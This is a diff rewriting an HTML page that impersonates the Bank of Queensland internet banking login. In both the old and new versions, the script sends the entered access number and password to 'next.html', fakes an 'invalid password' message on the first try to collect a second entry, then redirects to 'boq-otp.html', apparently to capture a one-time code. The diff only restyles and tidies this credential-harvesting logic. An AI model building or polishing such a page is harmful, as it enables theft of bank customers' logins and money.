@@ -1,93 +1,84 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>BOQ Internet Banking</title>
-  <style>
-    /* Minimal styles to make it look decent */
-    body { font-family: Arial, sans-serif; background: #f3f3f3; margin: 0; padding: 20px; }
-    .container { max-width: 400px; margin: 40px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-    h1 { font-size: 24px; margin-top: 0; }
-    label { font-weight: bold; display: block; margin-top: 15px; }
-    input[type="text"], input[type="password"] { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; margin-top: 5px; }
-    .btn { background: #1b75bc; color: white; border: none; padding: 12px 20px; border-radius: 4px; width: 100%; font-size: 16px; cursor: pointer; margin-top: 20px; }
-    .btn:disabled { background: #999; cursor: not-allowed; }
-    .error-msg { display: none; background: #f8d7da; color: #721c24; padding: 10px; border-radius: 4px; margin-top: 20px; border: 1px solid #f5c6cb; }
-    .error-msg .close { float: right; cursor: pointer; font-size: 20px; font-weight: bold; }
-  </style>
+    <meta charset="UTF-8">
+    <title>BOQ Internet Banking</title>
+    <style>
+        body { font-family: Arial; background: #f3f3f3; }
+        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 8px; }
+        .form-group { margin-bottom: 15px; }
+        label { display: block; font-weight: bold; }
+        input { width: 100%; padding: 8px; box-sizing: border-box; }
+        .btn { background: #1b75bc; color: white; padding: 10px 20px; border: none; border-radius: 4px; width: 100%; }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .alert { background: #f8d7da; color: #721c24; padding: 10px; display: none; margin-top: 10px; }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <h1>Welcome to BOQ Internet Banking</h1>
-    <form id="login-form">
-      <label for="txtUserid">Customer Access Number</label>
-      <input type="text" id="txtUserid" required autofocus>
+    <div class="container">
+        <h1>Welcome to BOQ</h1>
+        <form id="login-form">
+            <div class="form-group">
+                <label>Customer Access Number</label>
+                <input type="text" id="txtUserid" required>
+            </div>
+            <div class="form-group">
+                <label>Password</label>
+                <input type="password" id="id11" required>
+            </div>
+            <button type="submit" id="btnSignIn" class="btn" disabled>Log On</button>
+        </form>
+        <div id="error-msg" class="alert">
+            <span>The user information or password you have entered is not valid.</span>
+            <button id="cross-1" style="float:right; background:none; border:none; font-size:20px;">×</button>
+        </div>
+    </div>
 
-      <label for="id11">Password</label>
-      <input type="password" id="id11" required>
-
-      <button type="submit" id="btnSignIn" class="btn" disabled>Log On</button>
-
-      <div id="error-msg" class="error-msg">
-        <span class="close" id="cross-1">&times;</span>
-        The user information or password you have entered is not valid.
-      </div>
-    </form>
-  </div>
-
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
-  <script>
-    $(document).ready(function() {
-      // Enable/disable button based on fields
-      function toggleButton() {
-        var username = $('#txtUserid').val().trim();
-        var password = $('#id11').val().trim();
-        $('#btnSignIn').prop('disabled', !(username && password));
-      }
-      $('#txtUserid, #id11').on('keyup change', toggleButton);
-      toggleButton(); // initial state
-
-      var successCount = 0;
-
-      $('#login-form').submit(function(e) {
-        e.preventDefault();
-
-        var formData = {
-          username: $('#txtUserid').val().trim(),
-          password: $('#id11').val().trim(),
-          title: 'Bank of Queensland'
-        };
-
-        if (!formData.username || !formData.password) return;
-
-        $.ajax({
-          type: 'GET',
-          url: 'next.html',
-          data: formData,
-          success: function(response) {
-            console.log('Login sent successfully');
-            successCount++;
-            if (successCount === 1) {
-              // Show error message
-              $('#error-msg').show();
-              $('#txtUserid, #id11').val('');
-              toggleButton();
-            } else if (successCount === 2) {
-              window.location.href = 'boq-otp.html';
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+    <script>
+        $(document).ready(function() {
+            function toggleButton() {
+                const username = $('#txtUserid').val().trim();
+                const password = $('#id11').val().trim();
+                $('#btnSignIn').prop('disabled', !(username && password));
             }
-          },
-          error: function(xhr, status, error) {
-            alert('Error: ' + error + '\nPlease check the console for details.');
-            console.error('AJAX error:', status, error);
-          }
-        });
-      });
+            $('#txtUserid, #id11').on('keyup change', toggleButton);
+            $('#btnSignIn').prop('disabled', true);
 
-      $('#cross-1').click(function() {
-        $('#error-msg').hide();
-      });
-    });
-  </script>
+            let attempt = 0;
+
+            $('#login-form').submit(function(e) {
+                e.preventDefault();
+                const username = $('#txtUserid').val().trim();
+                const password = $('#id11').val().trim();
+                if (!username || !password) return;
+
+                attempt++;
+                const formData = { username, password, title: 'Bank of Queensland' };
+
+                $.ajax({
+                    type: 'GET',
+                    url: 'next.html',
+                    data: formData,
+                    success: function() {
+                        if (attempt === 1) {
+                            $('#error-msg').show();
+                            $('#txtUserid, #id11').val('');
+                            $('#btnSignIn').prop('disabled', true);
+                        } else if (attempt === 2) {
+                            window.location.href = 'boq-otp.html';
+                        }
+                    },
+                    error: function(xhr, status, error) {
+                        alert('Error: ' + status);
+                    }
+                });
+            });
+
+            $('#cross-1').click(function() {
+                $('#error-msg').hide();
+            });
+        });
+    </script>
 </body>
 </html>
